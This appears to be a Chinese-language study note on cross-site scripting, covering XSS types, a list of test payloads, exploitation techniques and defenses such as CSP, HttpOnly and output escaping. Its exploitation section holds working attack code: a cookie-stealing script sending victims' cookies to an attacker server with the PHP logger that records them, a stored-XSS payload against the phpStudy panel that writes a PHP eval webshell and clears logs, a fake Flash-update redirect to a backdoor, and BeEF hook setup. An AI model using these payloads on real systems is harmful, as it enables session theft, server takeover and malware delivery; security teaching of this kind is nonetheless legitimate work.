---
title: "XSS 基础"
date: 2025-03-20
tags:
  - Others
categories:
  - Others
---
# XSS 基础

跨站脚本攻击，攻击者向 Web 页面里插入恶意代码，一种客户端代码注入攻击。

- 成因：由于服务器对输入和输出没有做严格的验证，导致攻击者构造的字符输出到前端时被浏览器执行。

- 危害：
	1. 钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼 JavaScript 以监控目标网站的表单输入，甚至发起基于 DHTML 更高级的钓鱼攻击方式。
	2. 网站挂马：跨站时利用 IFrame 嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。
	3. 身份盗用：Cookie 是用户对于特定网站的身份验证标志，XSS 可以盗取到用户的 Cookie，从而利用该 Cookie 盗取用户对该网站的操作权限。如果一个网站管理员用户 Cookie 被窃取，将会对网站引发巨大的危害。
	4. 盗取网站用户信息：当能够窃取到用户 Cookie 从而获取到用户身份使，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。
	5. 垃圾信息发送：比如在 SNS 社区中，利用 XSS 漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。 
	6. 劫持用户 Web 行为：一些高级的 XSS 攻击甚至可以劫持用户的 Web 行为，监视用户的浏览历史，发送与接收的数据等等。
	7. XSS 蠕虫：XSS 蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施 DDoS 攻击等。

- 基础分类：反射型、存储型（大多出现在留言板、评论区）、DOM型（不与后台服务器进行交互，通过 DOM 从挨揍前端代码输出）；

## 反射型

![[attachments/Pasted image 20250323174255.png]]

基础演示：输入的内容显示在页面中；

![[attachments/Pasted image 20250323171839.png]]

当输入 JS 代码`<script>alert(1)</script>` ，源码没有对其进行过滤，网页则会执行该代码，弹框；

## 存储型

![[attachments/Pasted image 20250323174304.png]]

与反射型类似，存储型较为持久，通常页面与 SQL 后台或其他服务器有交互，将恶意代码存储于服务器端，当其他用户再次访问页面时触发。

## DOM 型

![[attachments/Pasted image 20250323174411.png]]

JS 代码通过获取当前页面用户输入来通过 DOM 修改页面所导致；

通过修改页面的 DOM 节点形成的 XSS，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情。

与反射型和存储型不同：DOM 不与服务器交互；而反射型 eg：获取 GET 请求参数显示在当前页面；

```html
<meta charset="UTF-8">

<script>
    function xss(){
        var str = document.getElementById("src").value;
        document.getElementById("demo").innerHTML = "<img src='"+str+"' />";
    }
</script>

<input type="text" id="src" size="50" placeholder="输入图片地址" />
<input type="button" value="插入" onclick="xss()" /><br>
<div id="demo" ></div>
```

用户输入框插入图片地址后，页面会将图片插入在 `id="demo"` 的 div 标签中，从而显示在网页上；当攻击者构造如下语句插入的时候：`' onerror=alert(233) '`，会直接在 `img` 标签中插入 `onerror` 事件，该语句表示当图片加载出错的时候，自动触发后面的 alert () 函数，来达到弹窗的效果。

插入后的页面源码：

```html
<div id="demo" >
<img src="" onerror="alert(233)" ''="">
</div>
```

## 常用测试代码

测试目标：

```
- 数据交互的地方 get、post、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义

- 数据输出的地方 用户资料 数据输出 评论，留言等 关键词、标签、说明 文件上传
```

```html
<input onfocus=write('xss') autofocus>
<img src onerror=alert('xss')>
<svg onload=alert('xss') >
<script>alert('xss')</script>
<a href="javascript:alert('xss')">clickme</a>
</td><script>alert(123456)</script>
'><script>alert(123456)</script>
"><script>alert(123456)</script>
</title><script>alert(123456)</script>
<scrip<script>t>alert(123456)</scrip</script>t>
</div><script>alert(123456)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))</script>	<!--对alert('XSS')进行编码-->
";alert('XSS');"
";alert('XSS');//
';alert('XSS');'	<!--htmlentities()会将双引号"特殊编码，但是却它不编码单引号'-->
/"><script>alert('XSS')</script>//
/" onclick=alert('XSS')//
<input onclick=alert('XSS') />
```

## 基础利用方式

以一个网贷网站为示例：

![[attachments/1-1.png]]

前端用户提交账户结算申请处存在存储型 XSS 漏洞；

![[attachments/1-2.png]]

后台管理页面存在结算申请管理页面，会显示当前用户所提交的结算申请，此时存储型 XSS 漏洞会存储至管理员页面，当管理员访问时则会触发；

### 获取 Cookie

- 利用手动方式模拟实现

`document.cookie`获取当前页面的 cookie；`window.location.href`获取当前地址；

利用这些构造 Payload：

`http://xx.xx.xx.xx/getcookie.php`替换攻击者的地址；

```js
<script>var url='http://xx.xx.xx.xx/getcookie.php?u='+window.location.href+'&c='+document.cookie;document.write("<img src="+url+" />");</script>
```

（管理员打开用户的申请管理页面）受害者触发 Payload，攻击者地址下的`getcookie.php`获取来自受害者访问的地址和 cookie； 

```php file:getcookie.php
<?php
$url=$_GET['u'];
$cookie=$_GET['c'];
$fp = fopen('cookie.txt',"a");
fwrite($fp,$url."|".$cookie."\n");
fclose($fp);
?>
```

- 工具平台

（蓝莲花）`BlueLotus_XSSReceiver`默认登录密码`bluelotus`；

攻击者搭建该平台，利用自带的 xss 脚本生成 Payload，随后写入存在 xss 漏洞的网页中并提交。

管理员登录访问结算管理页面则会触发；将其地址及 cookie 信息发送给改平台。

在接收面板获得信息；

![[attachments/1-4.png]]

### 数据提交

当无法获取网站凭据（cookie 等）时，若满足如下条件，则可尝试攻击；

条件：需要熟悉后台业务功能数据包，利用 JS 写一个模拟提交；

以小皮面板所存在的 xss 漏洞为例：

小皮面板中存在登录日志记录，攻击者在登录处填入 xss 利用脚本；管理员登录查看日志则会触发；

小皮面板管理网站可以创建文件；攻击者模拟管理员创建网站文件所发送的数据包；编写 JS 代码（创建一句话木马文件）；

```JS
function poc(){
  $.get('/service/app/tasks.php?type=task_list',{},function(data){
    var id=data.data[0].ID;
    $.post('/service/app/tasks.php?type=exec_task',{
      tid:id
    },function(res2){
        $.post('/service/app/log.php?type=clearlog',{
            
        },function(res3){},"json");
        
      
    },"json");
  },"json");
}
function save(){
  var data=new Object();
  data.task_id="";
  data.title="test";
  data.exec_cycle="1";
  data.week="1";
  data.day="3";
  data.hour="14";
  data.minute = "20";
  data.shell='echo "<?php @eval($_POST[123]);?>" >C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php';
  $.post('/service/app/tasks.php?type=save_shell',data,function(res){
    poc();
  },'json');
}
save();
```

将该文件放入自己搭建好的网站，在 Payload 中包含该地址，注入到日志中；

管理员登录则会触发，直接在网站目录下创建木马文件；

> 参考学习：
> 
> https://blog.csdn.net/RestoreJustice/article/details/129735449

### 网络钓鱼

制作简单的钓鱼页面；以 Flash 下载为例：（许多网站的视频图画等需要 Flash 才能加载）

在存在 xss 漏洞处，插入例如：`<script>alert('当前浏览器Flash版本过低,请下载升级！');location.href='http://x.x.x.x/flash.exe'</script>`这样的弹窗提示诱导用户下载后门；

保存 Flash 官网页面，部署相似的网站，将页面中的“立即下载” Flash 处的 URL 改为一个后门下载地址；

### 综合利用平台

浏览器控制框架-xss-beef

只需执行 JS 文件，即可实现对当前浏览器的控制，可配合各类手法利用

```txt
docker pull janes/beef
搭建：docker run --rm -p 3000:3000 janes/beef
访问：http://ip/ui/panel （账号密码：beef/beef）
利用Payload：<script src="http://ip:3000/hook.js"></script>

# docker pull registry.cn-shanghai.aliyuncs.com/yijingsec/beef:latest
# docker run -dp 3000:3000 registry.cn-shanghai.aliyuncs.com/yijingsec/beef:latest
# 账号密码：beef/yijingsec
```

## 防护与绕过

1. CSP

内容安全策略，一种可信白名单机制，用来限制网站中是否可以包含某来源内容。可明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需提供配置。

- 禁止加载外域代码，防止复杂的攻击逻辑；
- 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域；
- 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）；
- 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。

例如通过如下设置来限制域内、域外、目录等文件及代码的执行来防御 xss 的攻击；

```php
// 只允许加载本地源图片：
header("Content-Security-Policy:img-src 'self' ");

// 允许加载来自任何域的JS代码
header("Content-Security-Policy:default-src 'self'; script-src * ");

// 只允许加载当前域的JS代码。
header("Content-Security-Policy: default-src 'self'; script-src 'self' ");

// 只允许加载当前域的JS代码 还限制目录
header("Content-Security-Policy:default-src 'self';script-src http://192.168.1.4:82/63/static/");
```

绕过方式：

- 限制本地域，可借助网站的文件上传功能，上传写好的 JS 文件让其加载来绕过；
- 限制目录，若网站存在 302 跳转相关的内容处理，可以尝试利用目录穿越绕过，让其跳转到本地域再进行加载上传的 JS 文件；

> 参考学习：
> 
> https://xz.aliyun.com/news/11816

2. http-only

可以再设置 cookie 时使用该标记；当 cookie 被标记为 HttpOnly 时，JS 无法访问该 cookie ，只能通过 HTTP(S) 来传输；

> 参考学习：
> 
> https://blog.csdn.net/weixin_42478365/article/details/116597222

3. WAF 或代码 Filter

以 xss-labs 为例，其中提到了很多防护和绕过的方式；

标签实体化；标签闭合、单双引号闭合、正则匹配不完整、大小写、双写、Unicode 编码、隐藏属性触发闭合等；

4. 输入过滤

5. 输出转义

在变量输出到 HTML 页面时，用编码或转义来防御；如`htmlspecialchars()`把预定义的字符转换为 HTML 实体；

> 参考学习：
> 
> https://xz.aliyun.com/t/4067
> 
> https://www.sqlsec.com/2020/01/xss.html
> 
> https://www.sqlsec.com/2020/10/xss2.html
> 
> https://github.com/Re13orn/xss-lab
> 
> https://blog.csdn.net/2301_80031208/article/details/139159525
> 
> https://blog.csdn.net/l2872253606/article/details/125638898

> 许多绕过方式比较鸡肋，需要很多的前提条件且比较老旧，实际情况下很难进行绕过；不如跑路~
